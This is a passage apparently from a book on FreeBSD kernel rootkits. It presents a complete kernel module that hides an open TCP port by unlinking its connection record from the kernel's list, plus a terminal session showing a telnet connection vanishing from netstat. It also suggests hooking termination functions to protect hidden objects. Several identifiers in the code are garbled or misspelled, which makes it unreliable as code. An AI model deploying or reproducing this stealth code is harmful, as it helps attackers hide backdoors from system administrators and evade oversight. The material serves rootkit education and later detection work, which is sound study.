- md: "\n## 3.6.3 Example\n\nAt this point, it should come as no surprise that you\
    \ can hide an open TCP-based port by simply removing its inpcb structure from\
    \ tcbinfo.listhead. Listing 3-3 is a system module designed to do just that. The\
    \ system call is invoked with one argument: an integer containing the local port\
    \ to be hidden.\n\n```\n#include <sys/types.h>\n#include <sys/param.h>\n#include\
    \ <sys/proc.h>\n#include <sys/module.h>\n#include <sys/sysent.h>\n#include <sys/kernel.h>\n\
    #include <sys/system.h>\n#include <sys/queue.h>\n#include <sys/socket.h>\n\n#include\
    \ <net/if.h>\n#include <netinet/in.h>\n#include <netinet/in_pcb.var>\n#include\
    \ <netinet/ip_var.h>\n#include <netinet/tcp_var.h>\n\nstruct port_hiding_args\
    \ {\n    u_int16_t lport;      /* local port */\n};\n\n/* System call to hide\
    \ an open port. */\nstatic int\nport_hiding(struct thread *td, void *syscall_args)\n\
    {\n    struct port_hiding_args *uap;\n    uap = (struct port_hiding_args *)syscall_args;\n\
    \n    struct inpcb *inpcb;\n\n    /* Iterate through the TCP-based inpcb list.\
    \ */\n    LIST_FOREACH(inpcb, tcbinfo.listhead, inp_list) {\n        if (inpcb->inp_vflag\
    \ & IN_TIMEWAIT)\n            continue;\n\n        IN_LOCK(inpcb);\n\n       \
    \ /* Do we want to hide this local open port? */\n        if (uap->lport == ntohs(inpcb->inp_inc.inc.ie_ie_lport))\
    \ {\n            LIST_REMOVE(inpcb, inp_list);\n            INP_UNLOCK(inpcb);\n\
    \        } else {\n            INP_UNLOCK(inpcb);\n        }\n    }\n    UN_LOCK(&tcbinfo);\n\
    \n    return(0);\n}\n\n/* The systent for the new system call. */\nstatic struct\
    \ systent port_hiding_systent = {\n    1,\t/* number of arguments */\n    port_hiding\t\
    /* implementing function */\n};\n\n/* The offset in systent[] where the system\
    \ call is to be allocated. */\nstatic int offset = NO_SYSCALL;\n\n```\n/* The\
    \ function called at load/unload. */\nstatic int\nload(struct module *module,\
    \ int cmd, void *arg)\n{\n    int error = 0;\n\n    switch (cmd) {\n        case\
    \ MOD_LOAD:\n            printf(\"System call loaded at offset %d.\\n\", offset);\n\
    \            break;\n\n        case MOD_UNLOAD:\n            printf(\"System call\
    \ unloaded from offset %d.\\n\", offset);\n            break;\n\n        default:\n\
    \            error = EOPNOTSUPP;\n            break;\n    }\n\n    return(error);\n\
    }\n```\n\nSYSCALL_MODULE(port_hiding, offset, &port_hiding_systent, load, NULL);\n\
    \nListing 3-3: port_hiding.c\n\nAn interesting detail about this code is that\
    \ we examine each inpcb structure's inp_vflag member. If the inpcb is found to\
    \ be in the 2MS wait state, I skip over it. What's the point of hiding a port\
    \ that's about close?\n\n> ² When a TCP connection performs an active close and\
    \ sends the final ACK, the connection is put into the 2MS wait state for twice\
    \ the maximum segment lifetime. This lets the TCP connection resend the final\
    \ ACK in case the first one was lost.\n\nIn the following output, telnet(1) to\
    \ a remote machine and then invoke port_hiding to hide the session:\n\n```\n$\
    \ telnet 192.168.123.107\nTrying 192.168.123.107...\nConnected to 192.168.123.107.\n\
    Escape character is '^]'.\nTrying SRA secure login:\nUser (ghost):\nPassword:\n\
    [ SRA accepts you ]\n```\n\nFreeBSD/1386 (alpha) tty0\n\n```\nLast login: Mon\
    \ Mar 5 09:55:50 on tty1\n$ sudo kload /port_hiding.ko\nSystem call loaded at\
    \ offset 210.\n$ netstat -anc tcp\nActive Internet connections (including servers)\n\
    Proto Recv-Q Send-Q Local Address Foreign Address (state)\ntcp4 0 0 192.168.123.107\
    \ 192.168.123.153.61141 ESTABLISHED\ntcp4 0 0 *.* LISTEN\ntcp4 0 0 127.0.0.1.25\
    \ *.* LISTEN\n$ perl -e 'syscall(210, 23);'\n$ netstat -ancp tcp\nActive Internet\
    \ connections (including servers)\nProto Recv-Q Send-Q Local Address Foreign Address\
    \ (state)\ntcp4 0 0 127.0.0.1.25 *.* LISTEN\n```\n\nNotice how port_hiding hid\
    \ the local telnet server as well as the connection. To change this behavior,\
    \ simply rewrite port_hiding to require two arguments: a local port and a local\
    \ address.\n\n## 3.7 Corrupting Kernel Data\n\nBefore I conclude this chapter,\
    \ let's consider the following: What happens when one of your hidden objects is\
    \ found and killed?\n\nIn the best case scenario, nothing. In the worst case scenario,\
    \ the kernel panics when an object is killed, the kernel unconditionally removes\
    \ it from its various lists. However, in this situation, the object has already\
    \ been removed. Therefore, the kernel will fail to find it, and will walk off\
    \ the end of its lists, corrupting that data structures in the process.\n\nTo\
    \ prevent this data corruption, here are some suggestions:\n\n- Hook the terminating\
    \ function(s) to prevent them from removing hidden objects.\n- Hook the terminating\
    \ function(s) to place your hidden objects back onto the lists before termination.\n\
    - Do nothing. If your hidden objects are never found, they can never be killed—right?\n\
    \n## 3.8 Concluding Remarks\n\nDKOM is one of the hardest rootkit techniques to\
    \ detect. By patching the objects the kernel relies upon for detection, you can\
    \ achieve remarkable stealth. In this chapter, we have explored how to manipulate\
    \ kernel data structures to hide processes, ports, and other objects. While DKOM\
    \ is a powerful technique, it is not without its risks. As we have seen, improper\
    \ implementation can lead to kernel panics and system instability.\n\nIn the next\
    \ chapter, we will discuss detection techniques for these types of rootkits.\n"
